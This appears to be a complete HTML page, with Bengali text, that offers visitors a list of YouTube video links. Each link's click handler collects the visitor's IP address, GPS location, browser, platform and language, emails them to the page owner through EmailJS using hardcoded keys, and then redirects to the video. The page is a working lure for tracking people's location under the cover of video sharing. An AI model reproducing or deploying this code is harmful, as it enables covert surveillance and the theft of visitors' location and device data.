<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Link and Location Tracker</title>
    <!-- Email.js Library -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Email.js Initialization with Public Key
        emailjs.init("9kXGOwMa--7DjEqMu"); // Replace with your Public Key

        // Function to fetch client IP using an API
        const getClientIP = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Failed to fetch IP:", error);
                return "Unknown";
            }
        };

        // Function to get Geolocation of the client
        const getClientLocation = () => {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    }, (error) => {
                        resolve({
                            latitude: "Unknown",
                            longitude: "Unknown"
                        });
                    });
                } else {
                    resolve({
                        latitude: "Not supported",
                        longitude: "Not supported"
                    });
                }
            });
        };

        // Function to collect client information
        const getClientInfo = async () => {
            const ip = await getClientIP();
            const location = await getClientLocation();
            return {
                ip: ip,
                browser: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                latitude: location.latitude,
                longitude: location.longitude,
            };
        };

        // Function to send email using Email.js
        const sendEmail = (data, videoLink) => {
            emailjs.send("service_ypwoyfa", "template_gvty23h", { // Your Service ID and Template ID
                ip: data.ip,
                browser: data.browser,
                platform: data.platform,
                language: data.language,
                latitude: data.latitude,
                longitude: data.longitude,
                video_link: videoLink // Include video link
            })
            .then((response) => {
                console.log("Email sent successfully!", response.status, response.text);
            })
            .catch((err) => {
                console.error("Failed to send email:", err);
            });
        };

        // Function to track and show YouTube video
        const handleYouTubeClick = async (event, videoLink) => {
            event.preventDefault(); // Prevent default link behavior
            alert("আপনার ইনফো সংগ্রহ করা হচ্ছে...");

            // Collect client info
            const clientInfo = await getClientInfo();
            console.log("Collected Info:", clientInfo);

            // Send email with client info and video link
            sendEmail(clientInfo, videoLink);

            // Redirect user to the YouTube video
            setTimeout(() => {
                window.location.href = videoLink;
            }, 2000); // Redirect after 2 seconds
        };
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }

        a {
            color: #007bff;
            text-decoration: underline;
            font-size: 18px;
            cursor: pointer;
        }

        a:hover {
            color: #0056b3;
        }
    </style>
</head>
<body>
    <h1></h1>
    <p>নিচের লিংকগুলো ক্লিক করুন এবং ইউটিউব ভিডিও উপভোগ করুন:</p>
    
    <!-- Link 1 -->
    <a href="https://youtu.be/723bv68rteE?si=pWW48kkwfJv2m42p" 
       onclick="handleYouTubeClick(event, 'https://youtu.be/723bv68rteE?si=pWW48kkwfJv2m42p')">
        Video 1: https://youtu.be/723bv68rteE?si=pWW48kkwfJv2m42p
    </a><br><br>

    <!-- Link 2 -->
    <a href="https://youtu.be/dQw4w9WgXcQ" 
       onclick="handleYouTubeClick(event, 'https://youtu.be/dQw4w9WgXcQ')">
        Video 2: https://youtu.be/dQw4w9WgXcQ
    </a><br><br>

    <!-- Link 3 -->
    <a href="https://youtu.be/3JZ_D3ELwOQ" 
       onclick="handleYouTubeClick(event, 'https://youtu.be/3JZ_D3ELwOQ')">
        Video 3: https://youtu.be/3JZ_D3ELwOQ
    </a><br><br>

    <!-- Link 4 -->
    <a href="https://youtu.be/6_b7RDuLwcI" 
       onclick="handleYouTubeClick(event, 'https://youtu.be/6_b7RDuLwcI')">
        Video 4: https://youtu.be/6_b7RDuLwcI
    </a><br><br>

    <!-- Link 5 -->
    <a href="https://youtu.be/KM7-jbOY0Io" 
       onclick="handleYouTubeClick(event, 'https://youtu.be/KM7-jbOY0Io')">
        Video 5: https://youtu.be/KM7-jbOY0Io
    </a><br><br>

</body>
</html>
